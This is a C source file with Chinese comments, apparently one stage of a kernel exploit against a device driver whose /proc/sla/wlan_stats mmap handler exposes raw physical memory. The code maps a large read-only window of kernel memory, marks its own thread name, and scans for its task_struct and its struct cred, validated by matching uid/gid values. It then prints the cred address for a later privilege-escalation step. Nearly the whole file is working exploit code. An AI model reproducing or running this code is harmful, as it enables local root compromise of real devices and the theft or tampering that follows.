/* credfind.c — 零 punch、零写入的"认出自己的 cred"探针。
 *
 * 一手事实(2026-09-28 反汇编 `stats_map@0xffffffc010f73258` + 真机 mtest):
 *   x9 = file->private_data;  pfn = __pa(x9) >> 12;  remap_pfn_range(vma, vm_start, pfn, len, prot)
 *   **全函数从头到尾没有读 vma->vm_pgoff** ⇒ mmap 的 offset 参数**完全不生效**
 *   (真机: offset=0/4K/64K/1M/16M/256M/1G/4G/16G/64G 首格全是同一个 0x000063ec686a7379)。
 *   ⇒ 之前"以 64MB 为一块把 offset 往前推 = 扫整机物理内存"的前提**是错的**，
 *     sen14 后半段每块报同一个 T_off/锚点就是重复映射的证据。
 *   ⇒ 真正得到的原语是: **从 `__pa(private_data)` 起、长度任意的"连续物理页窗口"只读**,
 *     窗口内 物理偏移 o  ↔  线性映射 VA = K + o (K = L_linear + __pa(private_data), 恒为页对齐)。
 *
 * 那么怎么在**一个固定窗口**里认出"我们自己的" cred? 三重独立确证, 一环都不靠猜:
 *   (1) `prctl(PR_SET_NAME)` 把本线程 comm 改成一个**每轮随机的 15 字符标记** ⇒
 *       在窗口里按字节搜这个字符串, 命中处就是"我们自己那条 task_struct 里的 comm";
 *   (2) comm 在 task_struct 里的偏移本机没量过 ⇒ **枚举 delta**: T = comm - delta,
 *       要求 `*(T+0x840) == *(T+0x848)`(real_cred 与 cred 相等)且像个核指针;
 *   (3) 把那个指针当成 cred 的 VA, 用 K 换算回窗口偏移, 读回来核对
 *       `uid/gid/suid/sgid/euid/egid/fsuid/fsgid` **八个 u32 全等于本进程 id**。
 * 三关全过才输出 `CRED=<hex>`。全程只 open+mmap+read, 不 punch、不写内核一个字节。
 *
 * 用法: credfind <15字符标记> [窗口字节数]   ⇒ stdout 最后一行 CRED=xxxx */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>

#ifndef PR_SET_NAME
#define PR_SET_NAME 15
#endif

static sigjmp_buf jb;
static volatile int on;
static void sbb(int s) { (void)s; if (on) siglongjmp(jb, 1); }
static uint64_t q(const unsigned char *p, size_t o) { uint64_t v; memcpy(&v, p + o, 8); return v; }
static int cmp64(const void *a, const void *b) {
  uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
  return x < y ? -1 : (x > y ? 1 : 0);
}
/* 求"窗口基址 K": 对每个像核指针的槽取 (值 - 自身偏移), **按页对齐分桶**再取众数。
 * (直接取原始值的众数会被"每 64 字节一个 hlist_head、first 指向自己+8"这类表带偏成 K+8;
 *  真 K 一定页对齐 ⇒ 先 &~0xfff 再统计。) */
static uint64_t find_base(const unsigned char *m, const unsigned char *ok, size_t np, size_t *cnt_out) {
  size_t cap = np * 512u + 16u;
  uint64_t *kv = malloc(cap * sizeof *kv);
  if (!kv) return 0;
  size_t n = 0;
  for (size_t i = 0; i < np; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + 8 <= (i + 1) * 4096u; o += 8) {
      uint64_t v = q(m, o);
      if ((v >> 48) != 0xffffULL) continue;
      if (v <= o) continue;
      if (n < cap) kv[n++] = (v - o) & ~0xfffULL;
    }
  }
  qsort(kv, n, sizeof *kv, cmp64);
  uint64_t best = 0; size_t bestn = 0, run = 1;
  for (size_t i = 1; i <= n; i++) {
    if (i < n && kv[i] == kv[i - 1]) run++;
    else { if (run > bestn) { bestn = run; best = kv[i - 1]; } run = 1; }
  }
  free(kv);
  if (cnt_out) *cnt_out = bestn;
  return best;
}

int main(int argc, char **argv) {
  const char *path = "/proc/sla/wlan_stats";
  const char *mark = argc > 1 ? argv[1] : "GH0STMARK12345";
  size_t want = argc > 2 ? (size_t)strtoull(argv[2], NULL, 0) : (2ull << 30);
  uid_t me = getuid(), mg = getgid();
  char nm[16];
  snprintf(nm, sizeof nm, "%.15s", mark);
  if (prctl(PR_SET_NAME, nm, 0, 0, 0)) printf("[-] prctl(PR_SET_NAME) errno=%d\n", errno);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) { printf("open %s 失败 errno=%d(%s)\n", path, errno, strerror(errno)); return 1; }
  size_t L = 0;
  unsigned char *m = MAP_FAILED;
  for (size_t s = want; s >= (16u << 20); s >>= 1) {
    m = mmap(NULL, s, PROT_READ, MAP_SHARED, fd, 0);
    if (m != MAP_FAILED) { L = s; break; }
  }
  if (m == MAP_FAILED) { printf("mmap 全失败 errno=%d(%s)\n", errno, strerror(errno)); return 2; }
  printf("[CF] %s: 一次 mmap 拿到窗口 len=%zu MB (offset 参数无效 ⇒ 窗口起点恒为 __pa(private_data))\n",
         path, L >> 20);
  struct sigaction sa, old;
  memset(&sa, 0, sizeof sa); sa.sa_handler = sbb; sigemptyset(&sa.sa_mask);
  sigaction(SIGBUS, &sa, &old);
  size_t np = L / 4096u, okp = 0;
  unsigned char *ok = calloc(np, 1);
  for (size_t i = 0; i < np; i++) {
    on = 1;
    if (sigsetjmp(jb, 1) == 0) { volatile char c = m[i * 4096u]; (void)c; ok[i] = 1; okp++; }
    on = 0;
  }
  size_t last_ok = 0;
  for (size_t i = 0; i < np; i++) if (ok[i]) last_ok = i;
  printf("[CF] 可读页 %zu/%zu (最后一个在 +%zu MB ⇒ 窗口实际覆盖到那里)\n",
         okp, np, (last_ok * 4096u) >> 20);
  size_t bcnt = 0;
  uint64_t K = find_base(m, ok, np, &bcnt);
  printf("[CF] 窗口基址 K=%016llx (页对齐分桶自洽 %zu 槽)\n", (unsigned long long)K, bcnt);
  if (!K) { printf("[CF] × 求不出基址 ⇒ 停\n"); return 3; }

  /* (1) 搜 comm 标记(整窗口逐字节, 最多记 64 处: 我们自己 task_struct 里的 comm,
   *     以及 argv 页/残渣里的副本, 全都当候选试一遍) */
  size_t ml = strlen(nm);
  size_t comm[64]; int nc = 0;
  for (size_t o = 0; o + ml + 1 <= L && nc < 64; o++) {
    size_t pg = o / 4096u;
    if (!ok[pg]) { o = (pg + 1) * 4096u; continue; }
    if (m[o] != nm[0]) continue;
    if (memcmp(m + o, nm, ml)) continue;
    comm[nc++] = o;
    printf("[CF] comm 标记 #%d @ +%zu (0x%zx, VA %016llx)\n", nc, o, o,
           (unsigned long long)(K + o));
  }
  if (!nc) { printf("[CF] × 窗口里没有我们的 comm 标记 ⇒ task_struct 不在窗口内\n"); return 4; }

  /* (2) 与偏移无关的找法: 在标记前后 8KB 里扫每一个 8 对齐槽, 只要它的**值**换算回窗口
   *    之后正好落在"cred 的 8 个 id 全是本进程 id"那个签名上, 这个值就是我们自己的 cred 的
   *    内核 VA。这样不需要知道 comm/cred 在 task_struct 里的确切偏移。 */
  const uint64_t SIG = 0x07d007d007d007d0ULL;
  static const int IO[8] = { 4, 8, 0xc, 0x10, 0x14, 0x18, 0x1c, 0x20 };
  int found = 0;
  for (int c = 0; c < nc && !found; c++) {
    size_t C = comm[c];
    size_t lo = C > 0x2000u ? C - 0x2000u : 0;
    size_t hi = C + 0x2000u;
    if (hi > L) hi = L;
    int nprint = 0;
    for (size_t Y = lo & ~(size_t)7; Y + 8 <= hi; Y += 8) {
      size_t pg = Y / 4096u;
      if (!ok[pg]) continue;
      uint64_t V = q(m, Y);
      if ((V >> 48) != 0xffffULL || (V & 7)) continue;
      if (V <= K) continue;
      size_t co = (size_t)(V - K);
      if (co + 0x30 > L || !ok[co / 4096u]) continue;
      if (q(m, co + 4) != SIG || q(m, co + 12) != SIG ||
          q(m, co + 20) != SIG || q(m, co + 28) != SIG) continue;
      uint32_t ids[8];
      for (int i = 0; i < 8; i++) {
        uint64_t wo = co + (uint64_t)IO[i];
        uint64_t w = q(m, wo & ~(uint64_t)7);
        ids[i] = (uint32_t)((wo & 4) ? (w >> 32) : (w & 0xffffffffULL));
      }
      int hit = 0;
      for (int i = 0; i < 8; i += 2) if ((uid_t)ids[i] == me) hit++;
      for (int i = 1; i < 8; i += 2) if ((gid_t)ids[i] == mg) hit++;
      size_t T = Y > 0x848u ? Y - 0x848u : 0;
      uint32_t prio = 0, sprio = 0;
      if (Y >= 0x848u && T + 0xbc <= L) { memcpy(&prio, m + T + 0xb4, 4); memcpy(&sprio, m + T + 0xb8, 4); }
      printf("[CF] 指针槽 +%zu ⇒ V=%016llx (窗口 +%zu) id %u %u %u %u %u %u %u %u ⇒ %d/8"
             "   [若该槽=+0x848 则 T=+0x%zx prio=%u sprio=%u stack=%016llx]\n",
             Y, (unsigned long long)V, co,
             ids[0], ids[1], ids[2], ids[3], ids[4], ids[5], ids[6], ids[7], hit,
             T, prio, sprio, (Y >= 0x848u && T + 0x70 <= L) ? (unsigned long long)q(m, T + 0x68) : 0ULL);
      if (hit < 8) continue;
      if (nprint++ >= 6) break;
      if (Y >= 0x848u && prio == sprio && prio <= 200) {
        printf("[CF] ★★★ 两关全过(comm 标记附近的指针 + 8/8 id) ⇒ **CRED = %016llx**\n",
               (unsigned long long)V);
        printf("CRED=%llx\n", (unsigned long long)V);
        found = 1;
        break;
      }
    }
  }
  if (!found) printf("[CF] × 有 comm 命中但没有一个指针通过 cred 双重确证\n");
  munmap(m, L);
  close(fd);
  return found ? 0 : 5;
}
